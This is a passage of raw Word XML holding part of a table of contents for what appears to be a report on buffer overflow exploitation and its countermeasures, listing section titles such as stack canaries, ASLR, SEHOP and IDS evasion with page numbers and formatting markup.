                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>Countermeasures</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc103326472 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>18</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="739A837B" w14:textId="1775A488" w:rsidR="00585AA4" w:rsidRDefault="00C34234">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc103326473" w:history="1">
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>Stack Canaries</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc103326473 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>19</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="09B3024B" w14:textId="207CEE86" w:rsidR="00585AA4" w:rsidRDefault="00C34234">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc103326474" w:history="1">
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>Address Space Randomization (ASLR)</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc103326474 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>19</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="336BAD6C" w14:textId="24049CB2" w:rsidR="00585AA4" w:rsidRDefault="00C34234">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc103326475" w:history="1">
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>Structured Exception Handler Overwrite Protection (SEHOP)</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc103326475 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>19</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="44E8C839" w14:textId="0523571C" w:rsidR="00585AA4" w:rsidRDefault="00C34234">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc103326476" w:history="1">
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>3.3</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>Evading Intrusion Detection Systems</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc103326476 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>19</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="31561131" w14:textId="6EB6D3FE" w:rsidR="00585AA4" w:rsidRDefault="00C34234">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc103326477" w:history="1">
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>Obfuscation</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc103326477 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>20</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="4DDE6083" w14:textId="311B773C" w:rsidR="00585AA4" w:rsidRDefault="00C34234">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc103326478" w:history="1">
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>Evasion</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc103326478 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>20</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="67296804" w14:textId="6721A760" w:rsidR="00585AA4" w:rsidRDefault="00C34234">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc103326479" w:history="1">
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>Denial of Service</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc103326479 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>20</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="3A8846E8" w14:textId="3AF6E49B" w:rsidR="00585AA4" w:rsidRDefault="00C34234">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc103326480" w:history="1">
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>3.4</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>Conclusion</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc103326480 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>21</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="191509E0" w14:textId="49158D6E" w:rsidR="00585AA4" w:rsidRDefault="00C34234">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc103326481" w:history="1">
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>4</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>References</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc103326481 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>22</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="572896D0" w14:textId="7574B8CB" w:rsidR="00585AA4" w:rsidRDefault="00C34234">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc103326482" w:history="1">
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>5</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Appendices</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc103326482 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>24</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="4B2E8B7E" w14:textId="377677A9" w:rsidR="00585AA4" w:rsidRDefault="00C34234">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc103326483" w:history="1">
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>5.1</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>Appendix A - Screenshots</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc103326483 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>24</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="53AA4A1F" w14:textId="02AA9FA9" w:rsidR="00585AA4" w:rsidRDefault="00C34234">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc103326484" w:history="1">
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>A1 - Full output from the initial overflow test</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc103326484 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>24</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="46EA6FF0" w14:textId="23489F16" w:rsidR="00585AA4" w:rsidRDefault="00C34234">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc103326485" w:history="1">
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>A2 - The contents of crash.pl after running pattern_create.exe</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc103326485 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
